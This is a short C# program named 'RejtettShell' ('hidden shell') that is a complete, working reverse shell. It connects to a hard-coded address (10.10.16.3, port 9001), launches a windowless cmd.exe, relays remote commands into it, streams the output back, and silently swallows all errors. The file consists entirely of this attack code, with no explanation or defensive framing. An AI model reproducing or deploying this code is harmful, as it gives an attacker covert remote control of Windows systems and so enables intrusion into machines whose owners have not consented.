using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

namespace RejtettShell
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                using (TcpClient client = new TcpClient("10.10.16.3", 9001))
                {
                    using (Stream stream = client.GetStream())
                    {
                        using (StreamReader reader = new StreamReader(stream))
                        {
                            using (StreamWriter writer = new StreamWriter(stream))
                            {
                                Process p = new Process();
                                p.StartInfo.FileName = "cmd.exe";
                                p.StartInfo.CreateNoWindow = true;
                                p.StartInfo.UseShellExecute = false;
                                p.StartInfo.RedirectStandardOutput = true;
                                p.StartInfo.RedirectStandardInput = true;
                                p.StartInfo.RedirectStandardError = true;

                                p.OutputDataReceived += (sender, e) => { if (e.Data != null) writer.WriteLine(e.Data); writer.Flush(); };
                                p.ErrorDataReceived += (sender, e) => { if (e.Data != null) writer.WriteLine(e.Data); writer.Flush(); };

                                p.Start();
                                p.BeginOutputReadLine();
                                p.BeginErrorReadLine();

                                string line;
                                while ((line = reader.ReadLine()) != null)
                                {
                                    p.StandardInput.WriteLine(line);
                                }
                            }
                        }
                    }
                }
            }
            catch { }
        }
    }
}
